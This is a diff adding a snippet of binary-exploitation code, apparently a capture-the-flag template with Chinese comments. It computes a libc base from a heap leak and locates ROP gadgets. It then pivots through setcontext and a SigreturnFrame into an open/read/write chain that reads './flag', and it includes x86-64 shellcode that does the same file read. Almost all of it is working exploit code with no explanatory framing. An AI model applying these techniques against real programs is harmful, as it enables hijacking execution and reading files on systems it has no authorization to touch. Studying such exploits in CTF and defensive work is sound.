@@ -1,0 +1,60 @@
+
+ #unsortedbin 与 libc 偏移 == 0x3ebca0
+libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
+setcontext_door = libcbase + libc.sym['setcontext'] + 53
+free_hook = libcbase + libc.sym['__free_hook']
+
+#=========================setcontext===========================
+
+prdi_ret = libcbase + libc.search(asm("pop rdi\nret")).next()
+prsi_ret = libcbase + libc.search(asm("pop rsi\nret")).next()
+prdx_ret = libcbase + libc.search(asm("pop rdx\nret")).next()
+
+def ropchain(function,arg1,arg2,arg3):
+	ret  = p64(prdi_ret) + p64(arg1)
+	ret += p64(prsi_ret) + p64(arg2)
+	ret += p64(prdx_ret) + p64(arg3)
+	ret += p64(function)
+	return ret
+
+open_addr = libcbase + libc.sym['open']
+read_addr = libcbase + libc.sym['read']
+write_addr = libcbase + libc.sym['write']
+
+context_addr = heapbase + 0x2a0 #0x250 + 0x20 + 0x20 + 0x10 储存 orw 链的堆用户数据地址（需修改）
+flag_string_addr = context_addr + 0x200 # './flag'地址
+frame = SigreturnFrame()
+frame.rsp = context_addr + 0xf8 #  rdi+0xa0 指向 orw 链 
+frame.rip = libcbase + libc.search(asm("ret")).next() # rdi+0xa8 ret地址 
+
+payload = str(frame)
+payload += ropchain(open_addr,flag_string_addr,0,0)
+payload += ropchain(read_addr,3,flag_string_addr,0x30)
+payload += ropchain(write_addr,1,flag_string_addr,0x30)
+payload = payload.ljust(0x200,'\x00') 
+payload += './flag\x00'
+
+#============================================================
+
+
+------------------------------------------------shellcode--------------------------------
+shellcode=f"""
+xor rsi,rsi;
+xor rdx,rdx;
+push rdx;
+mov rax,{convert_str_asmencode("././flag")};
+push rax;
+mov rdi,rsp;
+xor rax,rax;
+mov al,2;
+syscall;
+mov rdi,rax;
+mov dl,0x40;
+mov rsi,rsp
+mov al,0;
+syscall;
+xor rdi,rdi;
+mov al,1;
+syscall;
+"""
+----------------------------------------------------------------------------------------------
